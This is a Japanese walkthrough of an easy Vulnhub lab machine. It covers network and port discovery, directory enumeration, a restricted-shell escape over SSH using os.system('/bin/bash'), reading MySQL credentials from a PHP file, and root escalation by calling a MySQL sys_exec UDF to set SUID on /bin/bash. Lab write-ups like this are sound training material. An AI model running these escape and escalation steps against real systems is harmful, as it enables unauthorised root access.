## Target Information（対象情報）

Machine : Linux

Platform : Vulnhub

Difficulty : Easy

Target IP : 192.168.56.7

Goal : root権限の取得

## Reconnaissance（事前調査）

対象マシンのIPアドレスを特定
```bash
netdiscover -r 192.168.56.0/24
```

## ポートスキャン

公開されているポートとサービスの確認
```bash
nmap -Pn -sS -sV 192.168.56.7
```
{% include image.html file="00002.png" %}

## ディレクトリ列挙

ディレクトリ・サブドメイン探索の探索
```bash
gobuster dir -u http://192.168.56.7 -w /usr/share/wordlists/dirb/common.txt
```

## データベース列挙

## SSH

先ほど取得した情報でSSH接続を試行し、接続が出来た。

helpコマンドで lpath を確認したので、lshellと予想し制限シェルからの侵入
```bash
ssh -o HostKeyAlgorithms=+ssh-rsa john@192.168.56.7
?
echo os.system('/bin/bash')
id
```

## MySQL接続情報取得

MySQLのエラー時に確認されたディレクトリへ移動し、phpを覗くと接続情報が直接記入されていた
```bash
cd /var/www/
cat checklogin.php
```

## MySQL調査

先ほどの情報で接続を行い、データを探す
```bash
mysql -u root -p
mysql> show databases;
mysql> use members;
mysql> select * from members;
```
{% include image.html file="00015.png" %}

## MySQL UDFを利用した権限昇格

UDFの確認を行い、sys_execを利用してbashにsuidを設定して実行することでroot権限取得
```bash
mysql> select * from mysql.func;
mysql> select sys_exec('chmod u+s /bin/bash');
mysql> exit
ls /bin/bash
ls -l /bin/bash
bash -p
id
whoami
```
